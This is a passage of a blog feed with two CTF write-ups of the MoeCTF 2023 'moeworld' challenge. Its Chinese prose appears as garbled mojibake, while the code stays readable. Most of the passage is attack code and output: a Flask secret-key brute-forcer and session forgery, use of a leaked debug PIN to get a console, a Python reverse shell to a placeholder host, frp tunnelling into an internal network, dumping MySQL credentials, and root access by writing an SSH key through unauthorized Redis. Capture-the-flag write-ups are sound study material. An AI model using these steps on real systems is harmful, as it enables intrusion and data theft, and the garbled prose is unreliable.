href="https://blog.csdn.net/Sapphire037/article/details/126919498">CTF]2022ç¾å›¢CTF WEB WP_os.urandom(2).hex()_Sapphire037çš„åšå®¢-CSDNåšå®¢</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dict.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>a<span class="token operator">=</span><span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>a<span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span></code></pre><p><a href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis&#x2F;Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)</a></p><p><a href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>-unsignå·¥å…·å¯ä»¥é€šè¿‡å­—å…¸çˆ†ç ´key</p><p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·æ¥è·å–å½“å‰çš„session</p><pre class="language-none"><code class="language-none">flask-unsign.exe --unsign --cookie &quot;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImFiY2QifQ.ZQ6D4A.1l_objuFHXoApsS1mvzzMsl9k2w&quot; --wordlist .\dict.txt</code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923142853852.png" alt="image-20230923142853852" loading="lazy"></p><p>ä½¿ç”¨flask-session-cookie-manager å·¥å…·å¯¹è·å–çš„keyè¿›è¡ŒåŠ å¯†ç®¡ç†å‘˜session</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143402274.png" alt="image-20230923143402274" loading="lazy"></p><p>æ›¿æ¢åŸæœ¬sessionè¿›è¡Œç™»å½•å¯è§pinæ³„éœ²</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143843592.png" alt="image-20230923143843592" loading="lazy"></p><p>æœ‰äº†è¯¥pinç å¯è®¿é—®ç»™å‡ºçš„consoleæ¥å£ä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤</p><p><a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a></p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144108060.png" alt="image-20230923144108060" loading="lazy"></p><p>åˆ°ç°åœ¨å¤–ç½‘åŸºæœ¬æ‹¿ä¸‹äº†æ¥ä¸‹æ¥éœ€è¦å†…ç½‘æ¸—é€æ ¹æ®é¢˜ç›®æç¤ºéœ€è¦è¯»å–æ ¹ç›®å½•çš„æç¤ºæ–‡ä»¶</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144614869.png" alt="image-20230923144614869" loading="lazy"></p><p>ç”±äºè¯¥é¡µé¢æ“ä½œä¸æ˜¯ç‰¹åˆ«å‹å¥½åå¼¹ä¸€ä¸ªshellåœ¨vpsä¸Šä»¥ä¾¿åç»­æ“ä½œ</p><p>åå¼¹shellç”Ÿæˆç½‘ç«™ï¼š<a href="https://www.ddosi.org/shell/">åå¼¹shellå‘½ä»¤åœ¨çº¿ç”Ÿæˆå™¨|ğŸ”°é›¨è‹ğŸ”° (ddosi.org)</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> socket,subprocess,os<span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span>socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s.connect<span class="token variable"><span class="token punctuation">((</span>"your<span class="token operator">-</span>ip"<span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">))</span></span><span class="token punctuation">;</span>os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,0<span class="token punctuation">)</span><span class="token punctuation">;</span> os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token punctuation">;</span>os.dup2<span class="token punctuation">(</span>s.fileno<span class="token punctuation">(</span><span class="token punctuation">)</span>,2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">import</span> pty<span class="token punctuation">;</span> pty.spawn<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145032369.png" alt="image-20230923145032369" loading="lazy"></p><p>æ ¹æ®å‰é¢çš„æç¤ºéœ€è¦å¯¹å†…ç½‘è¿›è¡Œæ‰«æï¼Œä½¿ç”¨fscanå·¥å…·å¯¹å…¶å®ƒä¸»æœºè¿›è¡Œä¸€ä¸ªåˆæ­¥çš„åˆ¤æ–­</p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145238948.png" alt="image-20230923145238948" loading="lazy"></p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145730806.png" alt="image-20230923145730806" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.20</span>.0.1:888 <span class="token function">open</span><span class="token number">172.20</span>.0.2:22 <span class="token function">open</span><span class="token number">172.20</span>.0.1:22 <span class="token function">open</span><span class="token number">172.20</span>.0.1:21 <span class="token function">open</span><span class="token number">172.20</span>.0.2:6379 <span class="token function">open</span><span class="token number">172.20</span>.0.4:8080 <span class="token function">open</span><span class="token number">172.20</span>.0.1:80 <span class="token function">open</span><span class="token number">172.20</span>.0.3:3306 <span class="token function">open</span><span class="token number">172.20</span>.0.1:3306 <span class="token function">open</span><span class="token number">172.20</span>.0.1:7777 <span class="token function">open</span></code></pre><p>æ’é™¤ç½‘å…³åœ°å€å­˜åœ¨mysqlå’Œredisæ ¹æ®é¢˜ç›®è¦æ±‚å¯è§£å‡ºç¬¬äºŒä¸ªå‹ç¼©åŒ…å¯†ç </p><p><strong>22-3306-6379-8080</strong></p><pre class="language-none"><code class="language-none">å½“ä½ çœ‹åˆ°æ­¤éƒ¨åˆ†ï¼Œè¯æ˜ä½ æ­£ç¡®çš„è¿›è¡Œäº†fscançš„æ“ä½œå¾—åˆ°äº†æ­£ç¡®çš„ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œåœ¨æœ¬å†…ç½‘ä¸‹è¿˜æœ‰å¦å¤–ä¸¤å°æœåŠ¡å™¨å…¶ä¸­ä¸€å°å¼€å¯äº†22(ssh)å’Œ6379(redis)ç«¯å£å¦ä¸€å°å¼€å¯äº†3306(mysql)ç«¯å£è¿˜æœ‰ä¸€å°æ­£æ˜¯ä½ è®¿é—®åˆ°çš„ç•™è¨€æ¿æœåŠ¡æ¥ä¸‹æ¥ï¼Œä½ å¯èƒ½éœ€è¦æ­å»ºä»£ç†ï¼Œä»è€Œä½¿ä½ çš„æœ¬æœºèƒ½ç›´æ¥è®¿é—®åˆ°å†…ç½‘çš„æœåŠ¡å™¨æ­¤å¤„å¯äº†è§£&#96;nps&#96;å’Œ&#96;frp&#96;ï¼ŒåŒæ ·åœ¨&#x2F;app&#x2F;toolså·²å†…ç½®äº†ç›¸åº”æ–‡ä»¶è¿æ¥ä»£ç†ï¼Œæ¨è&#96;proxychains&#96;å¯¹äºmysqlæœåŠ¡å™¨ï¼Œä½ éœ€è¦æ‰¾åˆ°å…¶è´¦å·å¯†ç å¹¶æˆåŠŸè¿æ¥ï¼Œåœ¨æ•°æ®åº“ä¸­æ‰¾åˆ°flag2å¯¹äºredisæœåŠ¡å™¨ï¼Œä½ å¯ä»¥å­¦ä¹ å…¶ç›¸å…³çš„æ¸—é€æŠ€å·§ï¼Œä»è€Œè·å–åˆ°redisçš„æƒé™ï¼Œå¹¶è¿›ä¸€æ­¥å¯»æ‰¾å…¶getshellçš„æ–¹å¼ï¼Œæœ€ç»ˆå¾—åˆ°flag3</code></pre><p>åˆ°è¿™é‡Œå°±éœ€è¦æ­å»ºä»£ç†è¿›è¡Œå†…ç½‘æ¸—é€äº†æ¨èä½¿ç”¨frpè¿›è¡Œå†…ç½‘ç©¿é€VPSæ­å»ºå¥½æœåŠ¡ç«¯</p><p>åŸºæœ¬é…ç½®å¦‚ä¸‹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port <span class="token operator">=</span> <span class="token number">7000</span></code></pre><p>æ¥ä¸‹æ¥æ˜¯å®¢æˆ·ç«¯é…ç½®</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>common<span class="token punctuation">]</span><span class="token assign-left variable">server_addr</span><span class="token operator">=</span>vps-addr<span class="token assign-left variable">server_port</span><span class="token operator">=</span><span class="token number">7000</span><span class="token punctuation">[</span>socks5_proxy<span class="token punctuation">]</span>remote_port <span class="token operator">=</span> <span class="token number">6005</span>plugin <span class="token operator">=</span> socks5<span class="token punctuation">[</span>mysql<span class="token punctuation">]</span><span class="token builtin class-name">type</span> <span class="token operator">=</span> tcplocal_ip <span class="token operator">=</span> <span class="token number">172.20</span>.0.3local_port <span class="token operator">=</span> <span class="token number">3306</span>remote_port <span class="token operator">=</span> <span class="token number">6001</span></code></pre><p>ç”±äºåå¼¹shellä¸å¤ªå¥½å†™å…¥åªèƒ½ä¸€è¡Œä¸€è¡Œçš„è¿›è¡Œå†™å…¥</p><p><a href="https://blog.csdn.net/frdevolcqzyxynjds/article/details/106785218">linuxä¹‹echoå†™å…¥å•è¡Œæ–‡ä»¶ï¼Œcatå†™å…¥å¤šè¡Œæ–‡ä»¶_echoå†™å…¥å¤šè¡Œ_é—­å…³è‹¦ç‚¼å†…åŠŸçš„åšå®¢-CSDNåšå®¢</a></p><p>é“¾æ¥VPS IPå³å¯å¯†ç åœ¨ç½‘ç«™æ ¹ç›®å½•æœ‰ç»™å‡º</p><pre class="language-none"><code class="language-none">passwd&#x3D;&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;</code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160506306.png" alt="image-20230923160506306" loading="lazy"></p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160820637.png" alt="image-20230923160820637" loading="lazy"></p><p>æ¥ä¸‹æ¥éœ€è¦åˆ©ç”¨å†…ç½‘çš„redisè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œä¿®æ”¹frpé…ç½®æ–‡ä»¶è¿æ¥redis</p><p><a href="https://blog.csdn.net/FryhRx/article/details/124087653">redisæœªæˆæƒè®¿é—®æ¼æ´ä¸‰ç§ææƒæ–¹å¼_redisææƒ_é‡äº‹ä¸å†³ï¼Œå¯é—®æ˜¥é£ã€çš„åšå®¢-CSDNåšå®¢</a></p><pre class="language-none"><code class="language-none">[redis]type &#x3D; tcplocal_ip &#x3D; 172.20.0.2local_port &#x3D; 6379remote_port &#x3D; 6002[ssh]type &#x3D; tcplocal_ip &#x3D; 172.20.0.2local_port &#x3D; 22remote_port &#x3D; 6003</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>echo <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> key.txt<span class="token function">cat</span> /root/.ssh/key.txt <span class="token operator">|</span> redis-cli <span class="token parameter variable">-h</span> vps-ip <span class="token parameter variable">-p</span> <span class="token number">6002</span> <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> xxx</code></pre><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923162650038.png" alt="image-20230923162650038" loading="lazy"></p><p>å†™å…¥sshå…¬é’¥ä½¿ç”¨vpsç§é’¥è¿æ¥å³å¯åŒæ—¶ä¹Ÿéœ€è¦æŒ‚ä¸Šä»£ç†</p><p><strong>ssh -i id_rsa  root@vps-ip  -p 6003</strong></p><p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923163217649.png" alt="image-20230923163217649" loading="lazy"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/07/16/MoeCTF2023-web/constellation-moeworld/"/>
      <url>/2024/07/16/MoeCTF2023-web/constellation-moeworld/</url>
      
        <content type="html"><![CDATA[<h1 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h1><p>é¦–å…ˆçˆ†ç ´secret key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">import</span> zlib<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token comment">#https://github.com/noraj/flask-session-cookie-manager</span><span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>session_cookie_structure <span class="token operator">=</span> session_cookie_structuresi <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">"[Encoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">False</span>payload <span class="token operator">=</span> session_cookie_value<span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">True</span>payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> compressed<span class="token punctuation">:</span>data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">return</span> data<span class="token keyword">else</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>cookie <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> c <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>k <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>decode<span class="token punctuation">(</span>cookie<span class="token punctuation">,</span> <span class="token string">"This-random-secretKey-you-can't-get"</span><span class="token operator">+</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">pass</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token keyword">break</span></code></pre><p>secret keyæ˜¯<code>This-random-secretKey-you-can&#39;t-get06f0</code>,æœ‰äº†secret keyå°±èƒ½è‡ªå·±ä¿®æ”¹sessionä¸ºadminã€‚adminçš„privateç•™è¨€è¯´pinç 904-474-531ï¼Œæ‰€ä»¥å»åˆ°<a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a> ï¼Œè¾“å…¥pinç åˆ™è·å¾—console</p><p>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> subprocesssubprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>è·å¾—ç¬¬ä¸€éƒ¨åˆ†flagï¼š<code>moectf&#123;Information-leakage-Is-dangerous!</code></p><p>è¿˜æœ‰ä¸ªreadmeï¼Œpython decodeåçœ‹åˆ°æç¤º</p><pre class="language-none"><code class="language-none">æ­å–œä½ é€šè¿‡å¤–ç½‘æ¸—é€æ‹¿ä¸‹äº†æœ¬å°æœåŠ¡å™¨çš„æƒé™æ¥ä¸‹æ¥ï¼Œä½ éœ€è¦å°è¯•å†…ç½‘æ¸—é€ï¼Œæœ¬æœåŠ¡å™¨çš„&#x2F;app&#x2F;toolsç›®å½•ä¸‹å†…ç½®äº†fscanä½ éœ€è¦äº†è§£å®ƒçš„åŸºæœ¬ç”¨æ³•ï¼Œç„¶åæ‰«æå†…ç½‘çš„ipæ®µå¦‚æœä½ è¿›è¡Œäº†æ­£ç¡®çš„æ“ä½œï¼Œä¼šå¾—åˆ°ç±»ä¼¼ä¸‹é¢çš„ç»“æœ10.1.11.11:22 open10.1.23.21:8080 open10.1.23.23:9000 openå°†ä½ å¾—åˆ°çš„è‹¥å¹²ä¸ªç«¯å£å·ä»å°åˆ°å¤§æ’åºå¹¶ä»¥ - åˆ†å‰²ï¼Œè¿™ä¸€ä¸²å³ä¸ºhint.zipå‹ç¼©åŒ…çš„å¯†ç ï¼ˆæœ¬ä¾‹ä¸­ï¼Œå¯†ç ä¸ºï¼š22-8080-9000ï¼‰æ³¨æ„ï¼šè¯·å¿½ç•¥æ‰xx.xx.xx.1ï¼Œä¾‹å¦‚æ‰«å‡ºä¸‰ä¸ªip 192.168.0.1 192.168.0.2 192.168.0.3 ï¼Œè¯·å¿½ç•¥æ‰æœ‰å…³192.168.0.1çš„æ‰€æœ‰ç»“æœï¼æ­¤ä¸ºå‡ºé¢˜äººæœåŠ¡å™¨ä¸Šçš„å…¶å®ƒæ­£å¸¸æœåŠ¡å¯¹å¯†ç æœ‰ç–‘é—®éšæ—¶å’¨è¯¢å‡ºé¢˜äºº</code></pre><p>æç¤ºç”¨fscanï¼Œçœ‹ä¸€ä¸‹help</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan --help"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>æ˜¯è¿™ä¸ªå·¥å…·ï¼š <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>çœ‹ä¸€ä¸‹æœ¬æœºå†…ç½‘ip, å‚è€ƒ <a href="https://blog.csdn.net/kuanggudejimo/article/details/99454185">https://blog.csdn.net/kuanggudejimo/article/details/99454185</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">;</span>s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'8.8.8.8'</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ip <span class="token operator">=</span> s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ipä¸º<code>172.21.0.2</code>ã€‚æ‰«æï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"/app/tools/fscan -h 127.21.0.2/24"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°hint.zipå¯†ç ï¼š 22-3306-6379-8080</p><p>ç„¶åä¸è¦å¡åœ¨æ€ä¹ˆé…ç½®frpè¿›è¡Œå†…ç½‘ç©¿é€ï¼Œé‚£ä¸ªè¦è‡ªå·±å¼€vpsï¼Œæˆ–è€…è¦æœ‰ä¸ªè‡ªå·±çš„å…¬ç½‘ipã€‚ç©¿é€åªæ˜¯è¾…åŠ©æ•ˆæœï¼Œå¸®åŠ©æˆ‘ä»¬æ¸—é€æ›´åŠ æ–¹ä¾¿ï¼Œä¸é…ç½®ç›´æ¥ç”¨python consoleä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ä¹Ÿä¸è¦æƒ³ç”¨ngrokå…è´¹ç‰ˆï¼Œå…è´¹ç‰ˆåªèƒ½è½¬å‘ä¸€ä¸ªç«¯å£ï¼Œè€Œç©¿é€è‡³å°‘è¦ä¸¤ä¸ªç«¯å£ã€‚ç›´æ¥å»æmysqlï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"cat dataSql.py"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°sqlæ•°æ®åº“äº¤äº’çš„æºç ï¼Œé‡Œé¢æœ‰ç”¨æˆ·åå’Œå¯†ç ã€‚è¿æ¥:</p><pre class="language-python" data-language="python"><code class="language-python">db <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"mysql"</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">3306</span><span class="token punctuation">,</span>user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span>passwd<span class="token operator">=</span><span class="token string">"The_P0sswOrD_Y0u_Nev3r_Kn0w"</span><span class="token punctuation">,</span>database<span class="token operator">=</span><span class="token string">"messageboard"</span><span class="token punctuation">,</span>charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span></code></pre><p>æŸ¥å†…å®¹ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">cursor<span class="token operator">=</span>db<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select database()"</span><span class="token punctuation">)</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'messageboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(table_name))from(information_schema.tables)where(table_schema)='messageboard'"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag,message,users'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"select(group_concat(flag))from(flag)"</span><span class="token punctuation">)</span><span class="token number">1</span><span class="token operator">>></span><span class="token operator">></span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'-Are-YOu-myS0L-MasT3r?-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>æœ€åæ˜¯redisã€‚ç”¨pythonè£…ä¸ªredisæ¨¡å—ï¼ˆä¸çŸ¥é“ä¸ºå•¥apt-get installè£…ä¸äº†ï¼Ÿï¼‰ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install redis"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>ç„¶åè¿æ¥</p><pre class="language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ä»infoä¸­å¾—çŸ¥rediså­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ã€‚æ ¹æ® https:&#x2F;&#x2F;_thorns.gitbooks.io&#x2F;sec&#x2F;content&#x2F;redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html å¾€rootå†™ssh keyã€‚public_keyå’Œprivkeyåˆ©ç”¨<code>ssh-keygen -t rsa</code>ç”Ÿæˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'aaaaaaaaaa'</span><span class="token punctuation">,</span> <span class="token string">'\n\n'</span> <span class="token operator">+</span> public_key <span class="token operator">+</span> <span class="token string">'\n\n'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token 